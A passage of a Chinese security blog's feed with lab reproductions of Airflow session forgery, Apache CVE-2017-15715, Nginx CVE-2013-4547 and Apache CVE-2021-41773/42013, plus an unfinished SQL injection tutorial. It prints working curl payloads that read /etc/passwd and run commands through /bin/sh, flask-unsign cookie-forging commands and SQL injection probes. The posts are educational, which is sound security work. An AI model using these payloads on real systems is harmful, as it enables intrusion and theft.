encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将session_data,时间戳，和flask的密钥secret_key通过sha1运算的结果。</p><p>服务端收到cookie后，将session_date和Timestamp经过sha256运算，若与第三段HMAC不一样，则视为无效</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Airflow&lt;&#x3D;1.10.13</p><p>由于使用默认安全密钥（temporary_key）对身份验证信息进行签名，导致安全配置错误。当用户登录时，会设置一个名为session的 cookie ，其中包含 json 格式的用户认证信息。json 中名为user_id的密钥标识了登录的用户。此 json 使用在airflow.cfg配置文件中配置的字符串进行签名。在 1.10.15 和 2.0.2 版本之前，此字符串设置为temporary_key。官方文档和安装消息都没有说明更改此密钥。</p><p>由于cookie是经过base64编码的，其也相当于是明文传输，攻击者经解码后就可以得到cookie的真实内容，如果能得到密钥的话，则可实现伪造cookie以可以实现无需账号密码即可成功登录</p><ul><li><p>指纹<br>  FOFA:<br>  title&#x3D;&#x3D;”Airflow - Login”</p></li><li><p><strong>0.漏洞页面</strong></p></li></ul><p> <img src="/images/Airflow_0.PNG" alt="登录页面" title="登录页面"></p><ul><li><p><strong>1.获取session</strong></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://xxxxxx/admin/airflow/login</span><br><span class="line">curl -i -s -k -X $&#x27;GET&#x27; $&#x27;http://xxxxxx/admin/airflow/login&#x27; | grep Set-Cookie</span><br></pre></td></tr></table></figure><p>  <img src="/images/Airflow_1.PNG" alt="curl获取session" title="curl获取session"></p><p>  或者使用Cookie Editor<br>  <img src="/images/Airflow_2.PNG" alt="curl获取session" title="curl获取session"></p></li><li><p><strong>2.用Flask-unsign暴力破解密钥</strong></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#flask-unsign -u -c [session from Cookie]</span><br><span class="line">flask-unsign -u -c eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiODI0OWRmNDhiY2I0MGRjOWQwOGM4YzE3NDRjY2E1ZjZiMGFjOWU2YSJ9.ZDTLHA.VIcnwVJVKkXJjljNTWcBz6VgKWY</span><br></pre></td></tr></table></figure><p>  <img src="/images/Airflow_3.PNG" alt="flask-unsign" title="flask-unsign破解密钥"></p></li><li><p><strong>3.伪造cookie</strong><br>  用破解到的密钥伪造成一个真实用户或者管理员的会话</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -s --secret temporary_key -c &quot;&#123;&#x27;user_id&#x27;: &#x27;1&#x27;, &#x27;_fresh&#x27;: False, &#x27;_permanent&#x27;: True&#125;&quot;</span><br></pre></td></tr></table></figure><p>  <img src="/images/Airflow_4.PNG" alt="cookie伪造" title="flask-unsign伪造cookie"></p></li><li><p><strong>4.成功登录</strong><br>  <img src="/images/Airflow_5.PNG" alt="成功登录" title="成功登录"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Apache-Airflow&quot;&gt;&lt;a href=&quot;#Apache-Airflow&quot; class=&quot;headerlink&quot; title=&quot;Apache Airflow&quot;&gt;&lt;/a&gt;Apache Airflow&lt;/h2&gt;&lt;p&gt;Apache-Airflow 是Airbnb</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
    <link href="http://example.com/2023/04/06/Apache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/"/>
    <id>http://example.com/2023/04/06/Apache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</id>
    <published>2023-04-06T14:23:41.000Z</published>
    <updated>2023-04-13T13:32:35.854Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><ul><li><p><font size=4>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。</font></p></li><li><p><font size=4>该漏洞是由于apache在解析 <dr background=brack><code>1.php%0a</code></dr>时被当作PHP文件解析，导致该文件可以绕过一些黑名单检测和安全组策略，在Apache 2.4.0~2.4.29版本中均可能存在该漏洞</font></p></li></ul><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p><font size=4>Apache 2.4.0~2.4.29</font></p><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p><font size=4>Vulhub</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-comepose --build</span><br><span class="line">docker-comepose up -d</span><br></pre></td></tr></table></figure><h3 id="进入页面"><a href="#进入页面" class="headerlink" title="进入页面"></a>进入页面</h3><p><img src="/images/cve-2017-15715/0.png" title=" "></p><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p><img src="/images/cve-2017-15715/1.png" title=" "></p><h3 id="抓包修改"><a href="#抓包修改" class="headerlink" title="抓包修改"></a>抓包修改</h3><p>在evil.php后面加个任意字符，这里”@”<br><img src="/images/cve-2017-15715/2.png" title=" "></p><p>在16进制处修改找到‘@’的16进制<code>40</code><br><img src="/images/cve-2017-15715/3.png" title=" "></p><p>修改为<code>0a</code><br><img src="/images/cve-2017-15715/4.png" title=" "></p><h3 id="放行数据包，成功解析"><a href="#放行数据包，成功解析" class="headerlink" title="放行数据包，成功解析"></a>放行数据包，成功解析</h3><p><img src="/images/cve-2017-15715/5.png" title=" "></p><h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><h3 id="代码方面"><a href="#代码方面" class="headerlink" title="代码方面"></a>代码方面</h3><p><img src="/images/cve-2017-15715/6.png" title=" "></p><font size=4><p>可以看到，这里直接用的是<code>$_POST(&#39;name&#39;)</code>接受文件名，从而没有去除<code>%0a</code>，并且成功的绕过了黑名单<br></font></p><h3 id="配置方面"><a href="#配置方面" class="headerlink" title="配置方面"></a>配置方面</h3><p><font size=4 >我们先来看一下这里的一段配置</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><font size=4 ><p>说明能解析后缀名为.php$的文件，但是’ $ ‘,是正则表达式的一种匹配符号<br>我们先了解正则表达式rgExp中的multiline即\m:</p><p>如果正则表达式rgExp设置了 multiline 标志，那么 multiline 属性返回 true，否则返回 false。如果创建正则表达式对象时使用了 m 标志，那么 multiline 属性就是 true。</p><p>如果 multiline 为 false，那么 “^” 匹配字符串的开始位置，而 “$” 匹配字符串的结束位置。<br>如果 multline 为 true，那么 “^” 匹配字符串开始位置以及 “&#x2F;n” 或 “&#x2F;r” 之后的位置，而 “$” 匹配字符串结束位置以及 “&#x2F;n” 或 “&#x2F;r” 之前的位置。</p><p>综上，所以如果我们设置了RegExp 对象的 Multiline 属性(\m)的条件下，$还会匹配到字符串结尾的换行符（也就是%0a),那么文件名就变成.php，于是也就产生了这么一个换行解析漏洞<br></font></p><h2 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h2><ul><li><ol><li><font size=4>更新apache到2.4.29以上版本</font></li></ol></li><li><ol start="2"><li><font size=4>将上传的文件重命名为时间戳+随机数+.jpg&#x2F;png&#x2F;gif的格式并禁用上传文件目录执行脚本权限</font></li></ol></li><li><ol start="3"><li><font size=4>代码方面将’ $_POST[‘name’] ‘改为’ $_FILES[‘file’][‘name’] ‘,这样就会自动把换行符%0a去掉</font></li></ol></li></ul><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p><font size=4>其实这个漏洞利用条件还是满苛刻的</font></p><ul><li><p><font size=4>apache2.4.0~2.4.9</font></p></li><li><p><font size=4>代码方面用的是 $_POST[‘name’] </font></p></li><li><p><font size=4>相关配置方面没有修改 依旧是<code>.php$</code></font></p></li><li><p><font size=4>服务器是Linux，因为Windows会把%0a去掉</font></p></li></ul><p><font size=4>其实这个漏洞太老了，已经过去6年了，不过这个通过结合php正则表达式来绕过黑名单和安全策略的姿势是指得学习的</font></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-漏洞简介&quot;&gt;&lt;a href=&quot;#0x00-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简介&quot;&gt;&lt;/a&gt;0x00 漏洞简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;font size=4&gt;Apache HTTPD是一款HTTP服</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Nginx 文件名逻辑漏洞（CVE-2013-4547）</title>
    <link href="http://example.com/2023/04/02/Nginx%20%EF%BC%88CVE-2013-4547%EF%BC%89/"/>
    <id>http://example.com/2023/04/02/Nginx%20%EF%BC%88CVE-2013-4547%EF%BC%89/</id>
    <published>2023-04-02T13:04:02.000Z</published>
    <updated>2023-04-12T04:34:42.760Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>错误解析了请求的URI，导致错误的获取到用户上传的文件名，最后导致解析错误，出现权限绕过、代码执行的连带影响。</p><ul><li>相关知识</li></ul><p>CGI：是一种协议，定义了web服务器传递的数据格式。</p><p>FastCGI：优化版的CGI程序</p><p>PHP-CGI：PHP解释器，能够对PHP文件进行解析并返回相应的解析结果</p><p>PHP-FPM：FastCGI进程管理程序</p><p>当Nginx得到一个用户请求时，首先对url进行解析，进行正则匹配，如果匹配到以.php后缀结尾的文件名，会将请求的PHP文件交给PHP-CGI去解析。其中处理模块如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析</p><p>漏洞原理是 由于非法字符空格和截止符导致Nginx在解析URL时的有限状态机混乱，导致攻击者可以通过一个非编码空格绕过后缀名限制。</p><p>假设目标服务器存在’1.png’的文件,我们请求 <code>1.png[0x20][0x00].php</code>，这个URI可以匹配上正则<code>\.php$</code>，可以进入这个Location块；但进入后，Nginx却错误地认为请求的文件是<code>1.png[0x20]</code>，就设置其为SCRIPT_FILENAME的值发送给fastcgi。</p><p>fastcgi根据SCRIPT_FILENAME的值进行解析，最后造成了解析漏洞。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>影响版本：Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Vulhub</p><h3 id="1-上传一个图片马"><a href="#1-上传一个图片马" class="headerlink" title="1.上传一个图片马"></a>1.上传一个图片马</h3><p><img src="/images/cve-2013-4547/1.png" alt="upload_ma" title="upload_ma"></p><h3 id="2-在文件后缀名加上-0x20-0x00-php"><a href="#2-在文件后缀名加上-0x20-0x00-php" class="headerlink" title="2.在文件后缀名加上[0x20][0x00].php"></a>2.在文件后缀名加上[0x20][0x00].php</h3><p><img src="/images/cve-2013-4547/2.png" alt="upload_ma" title="upload_ma"></p><h3 id="3-图片马解析成功"><a href="#3-图片马解析成功" class="headerlink" title="3.图片马解析成功"></a>3.图片马解析成功</h3><p><img src="/images/cve-2013-4547/3.png" alt="upload_ma" title="upload_ma"></p><p>注意，<code>[0x20]</code>是空格，<code>[0x00]</code>是\0，这两个字符都不需要编码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;错误解析了请求的URI，导致错误的获取到用户上传的文件名，最后导致解析错误，出现权限绕过、代码执行的连带影响。&lt;/p&gt;
&lt;u</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Apache 路径穿越漏洞(CVE-2021-41773,CVE-2021-42013)</title>
    <link href="http://example.com/2023/04/01/Apache%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E(CVE-2021-41773)/"/>
    <id>http://example.com/2023/04/01/Apache%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E(CVE-2021-41773)/</id>
    <published>2023-04-01T14:53:21.000Z</published>
    <updated>2023-04-12T12:35:58.189Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-41773"><a href="#CVE-2021-41773" class="headerlink" title="CVE-2021-41773"></a>CVE-2021-41773</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache httpd Server 2.4.49 版本引入了一个具有路径穿越漏洞的新函数，该函数设计存在逻辑问题，可以结合特点的输入绕过，但需要配合穿越的目录配置 Require all granted，攻击者可利用该漏洞实现路径穿越从而读取任意文件，或者在配置了cgi的httpd程序中执行bash指令，从而有机会控制服务器。</p><p>漏洞满足需求:</p><ul><li><p>apache.version&#x3D;&#x3D;2.4.49</p></li><li><p>&lt; Directory &#x2F;&gt;Require all granted&lt; &#x2F;Directory&gt;</p></li></ul><p>这里只做了简单复现，想了解具体漏洞解析的请参考<br><a href="https://www.anquanke.com/post/id/256973">https://www.anquanke.com/post/id/256973</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Vulhub</p><h3 id="进入页面"><a href="#进入页面" class="headerlink" title="进入页面"></a>进入页面</h3><p><img src="/images/cve-2021-41773/0.png" alt="初始页面" title="初始页面"></p><h3 id="重现漏洞"><a href="#重现漏洞" class="headerlink" title="重现漏洞"></a>重现漏洞</h3><p>一个简单的 CURL 命令来重现漏洞（请注意，必须是现有目录）：&#x2F;icons&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --path-as-is http://192.168.10.132:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure><p>成功披露<code>/etc/passwd</code></p><p><img src="/images/cve-2021-41773/2.png" title="curl"></p><p><strong>或者在burpsuite中</strong></p><p><img src="/images/cve-2021-41773/1.png" title=" "></p><h3 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h3><p>在服务器上启用 <code>mods cgi</code> 或 <code>cgid</code> 后，此路径遍历漏洞将允许任意命令执行：<br>CRUL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --data &quot;echo;id&quot; &#x27;http://192.168.10.132:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/cve-2021-41773/4.png" title=" "></p><p><strong>或者在burpsuite中</strong></p><p><img src="/images/cve-2021-41773/3.png" title=" "></p><h1 id="CVE-2021-42013"><a href="#CVE-2021-42013" class="headerlink" title="CVE-2021-42013"></a>CVE-2021-42013</h1><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>CVE-2021-42013 是一个漏洞，由 CVE-2021-41773 修复不完整导致，攻击者可以使用路径遍历攻击将 URL 映射到类别名指令配置的目录之外的文件。CVE-2021-41773漏洞在v2.4.50版本中进行了修复。但修复版本中只处理了<code>/xx/.%2e/</code>这样的路径，而没有正确处理<code>/.%%32%65/</code>这种字符串，导致<code>/.%%32%65/</code>被带入后续的处理，仍然可造成目录穿越。攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取到Web目录之外的其他文件。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache 2.4.49&#x2F;2.4.50</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Vulhub</p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>Apache HTTP 服务器 2.4.50 修补了以前的 CVE-2021-41773 有效负载，例如 ，但它不完整。<br>所以在CVE-2021-41773的基础上，我们对输入进行二次URL编码即可绕过对<code>../</code>的检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --path-as-is http://192.168.10.132:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</span><br></pre></td></tr></table></figure><p>成功披露<code>/etc/passwd</code><br><img src="/images/cve-2021-41773/6.png" title=" "></p><p>命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --data &quot;echo;ls&quot; &#x27;http://192.168.10.132:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure><p>成功执行<code>echo;ls</code><br><img src="/images/cve-2021-41773/7.png" title=" "></p><h2 id="漏洞利用工具"><a href="#漏洞利用工具" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h2><p>地址:<a href="https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013">https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013</a></p><p>此工具可直接验证是否存在漏洞和直接利用漏洞</p><p><img src="/images/cve-2021-41773/5.png" title=" "></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2021-41773&quot;&gt;&lt;a href=&quot;#CVE-2021-41773&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-41773&quot;&gt;&lt;/a&gt;CVE-2021-41773&lt;/h1&gt;&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL注入基础</title>
    <link href="http://example.com/2023/03/01/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2023/03/01/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</id>
    <published>2023-03-01T07:19:36.000Z</published>
    <updated>2023-03-02T12:10:55.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="几个常用数据库的特性"><a href="#几个常用数据库的特性" class="headerlink" title="几个常用数据库的特性"></a>几个常用数据库的特性</h1><p>  每一种数据库都有他的特性，这里简单介绍一些主流的数据库的特性，MySql,MSSql,Oracle,PostgreSql.</p><h2 id="MySql"><a href="#MySql" class="headerlink" title="MySql"></a>MySql</h2><ol><li><p>默认端口：3306</p></li><li><p>字符串截取函数：SUBSTRING(‘String’, 4, 2)</p></li><li><p>注释符：- - + 或者 #</p></li><li><p>版本函数：select version(),或者 select @@version</p></li><li><p>数据库内容查询：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.tables</span><br><span class="line">SELECT * FROM information_schema.columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br></pre></td></tr></table></figure></li><li><p>条件错误（你可以测试单个布尔条件，并在条件为 true 时触发数据库错误）：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(exp, exp为true后执行, exp为false后执行)</span><br></pre></td></tr></table></figure></li></ol><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><ol><li><p>默认端口:1521</p></li><li><p>字符串截取函数：SUBSTR(‘String’, 4, 2)</p></li><li><p>注释符：- -</p></li><li><p>版本函数：<br>SELECT banner FROM v$version<br>SELECT version FROM v$instance</p></li><li><p>数据库内容查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> SELECT * FROM all_tables</span><br><span class="line">SELECT * FROM all_tab_columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br></pre></td></tr></table></figure></li><li><p>条件错误（你可以测试单个布尔条件，并在条件为 true 时触发数据库错误）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="MSSql"><a href="#MSSql" class="headerlink" title="MSSql"></a>MSSql</h2><ol><li><p>默认端口:1433</p></li><li><p>字符串截取函数：SUBSTR(‘String’, 4, 2)</p></li><li><p>注释符：- - </p></li><li><p>版本函数：SELECT @@version</p></li><li><p>数据库内容查询:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.tables</span><br><span class="line">SELECT * FROM information_schema.columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br></pre></td></tr></table></figure></p></li><li><p>条件错误（你可以测试单个布尔条件，并在条件为 true 时触发数据库错误）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IIF(exp, exp为true后执行, exp为false后执行)</span><br><span class="line">或者</span><br><span class="line">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="PostgreSql"><a href="#PostgreSql" class="headerlink" title="PostgreSql"></a>PostgreSql</h2><ol><li><p>默认端口:5432</p></li><li><p>字符串截取函数：SUBSTR(‘String’, 4, 2)</p></li><li><p>注释符：- - </p></li><li><p>版本函数：<br>SELECT version()</p></li><li><p>数据库内容查询：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.tables</span><br><span class="line">SELECT * FROM information_schema.columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br></pre></td></tr></table></figure></p></li><li><p>条件错误（你可以测试单个布尔条件，并在条件为 true 时触发数据库错误）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</span><br></pre></td></tr></table></figure></p></li></ol><h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><p>  SQL注入就是指Web应用没有对用户输入传来的数据进行合法性的判断，导致前端传入后端的参数数据是攻击者可控的，并且参数带入数据库的查询，攻击者就可以构造非法的语句来恶意进行数据库操作。  </p><p>  例如以下登录时的PHP代码：<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username, password FROM users </span><br><span class="line">      WHERE username=&#x27;**$_POST[&#x27;name&#x27;]**&#x27; and password=&#x27;**$_POST[&#x27;password&#x27;]**&#x27;&quot;;</span><br></pre></td></tr></table></figure><br>  因为这里的代码参数name,password是用户可控的，所以在登录时，如果没有相应的防护措施，用户可恶意使用非法语句进行攻击。</p><p>  当然，SQL注入得满足两个以下条件：</p><ul><li><input checked="" disabled="" type="checkbox"> 参数用户可控</li><li><input checked="" disabled="" type="checkbox"> 参数带入的数据库查询</li></ul><p>  如果用户POST传来的表单参数为<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name= 1&#x27; or 1=1;# &amp; password= 123  </span><br></pre></td></tr></table></figure><br>  则相应的查询语句就变为：<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE username=&#x27;1&#x27; or 1=1;# *and password=&#x27;123&#x27;;* </span><br></pre></td></tr></table></figure><br>  因为参数为“ 1’ or 1&#x3D;1;# ”，1&#x3D;1 始终为真，而后面的password语句被#注释了，所以通过验证，即可登录成功。</p><h1 id="SQL注入思路"><a href="#SQL注入思路" class="headerlink" title="SQL注入思路"></a>SQL注入思路</h1><ol><li>寻找注入点</li><li>判断数据库类型和服务器类型</li><li>根据相应的数据库特性进行注入</li></ol><h2 id="1-寻找注入点"><a href="#1-寻找注入点" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h2><p>  以下是一些常用的SQL注入点判断，直接用就行<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> and 1=2 #</span><br><span class="line"> or  1=1 #</span><br><span class="line"></span><br><span class="line">&#x27; and 1=2 #</span><br><span class="line">&#x27; or  1=1 #</span><br><span class="line"></span><br><span class="line">&quot; and 1=2 #</span><br><span class="line">&quot; or  1=1 #</span><br><span class="line"></span><br><span class="line">&#x27;) and 1=2 #</span><br><span class="line">&#x27;) or  1=1 #</span><br><span class="line"></span><br><span class="line">&quot;) and 1=2 #</span><br><span class="line">&quot;) or  1=1 #</span><br></pre></td></tr></table></figure></p><h2 id="2-判断数据库类型"><a href="#2-判断数据库类型" class="headerlink" title="2.判断数据库类型"></a>2.判断数据库类型</h2><p>  判断数据库类型可借用其他工具要方便快捷一些<br>  这里推荐一个插件：<strong>Wappalyzer</strong></p><p>  另外，就是通过不同数据库的特性来判断，如报错信息，端口，连接符等等</p><ol><li>通过各数据库特有的连接符判断数据库类型</li><li>通过特有的数据库的数据表判断</li></ol><table><thead><tr><th align="left">数据库</th><th align="left">连接符</th><th align="left">特有数据表</th></tr></thead><tbody><tr><td align="left">MySql</td><td align="left">‘and ‘1’ + ‘1’ &#x3D; ‘11’</td><td align="left">‘and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1</td></tr><tr><td align="left">MSSql</td><td align="left">‘and ‘1’ + ‘1’ &#x3D; ‘11’</td><td align="left">‘and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</td></tr><tr><td align="left">Oracle</td><td align="left">‘and ‘1’| | ‘1’&#x3D;’11’</td><td align="left">‘and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</td></tr><tr><td align="left">PostgreSQL</td><td align="left">‘and ‘1’| | ‘1’&#x3D;’11’</td><td align="left">‘and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1</td></tr></tbody></table><p>  当然，还有其他方法，这里就不一一列举</p><h2 id="3-根据数据库特性进行相应的注入攻击"><a href="#3-根据数据库特性进行相应的注入攻击" class="headerlink" title="3.根据数据库特性进行相应的注入攻击"></a>3.根据数据库特性进行相应的注入攻击</h2><p>  判断注入点和是哪一种数据库之后，我们开始进行注入攻击</p><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>  其实所有的SQL注入可分为两大类，分别是数字型和字符型，即根据前端传来的参数是字符还是数字类型判断，字符型的注入又可细分为：</p><ul><li>UNION 注入</li><li>XML报错注入</li><li>延时注入</li><li>二次注入</li><li>Cookie注入</li><li>XFF注入</li><li>编码注入</li><li>宽字节注入</li><li>堆叠注入</li><li>Boolean注入</li></ul><h2 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h2><p>  我们用union 进行构造SQL查询语句进行攻击，在又回显错误的情况时，我们直接通过回显判断</p><ol><li><p>判断字段数<br>通常我们用: order by n,order by n 